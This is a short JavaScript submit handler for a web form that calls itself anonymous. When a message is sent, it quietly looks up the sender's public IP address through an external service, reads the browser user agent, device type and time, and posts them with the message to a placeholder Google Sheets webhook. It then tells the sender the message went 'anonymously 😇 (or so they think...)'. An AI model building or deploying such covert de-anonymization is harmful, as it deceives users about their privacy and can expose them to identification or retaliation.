document.getElementById("anonForm").addEventListener("submit", async function (e) {
  e.preventDefault();
  const message = document.getElementById("message").value;

  const res = await fetch("https://api.ipify.org?format=json");
  const data = await res.json();
  const ip = data.ip;

  const userAgent = navigator.userAgent;
  const device = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
  const time = new Date().toLocaleString();

  // Send to your Google Sheets webhook
  fetch("YOUR_GOOGLE_APPS_SCRIPT_URL", {
    method: "POST",
    mode: "no-cors",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      message,
      ip,
      userAgent,
      device,
      time
    }),
  });

  alert("Message sent anonymously 😇 (or so they think...)");
  document.getElementById("message").value = "";
});
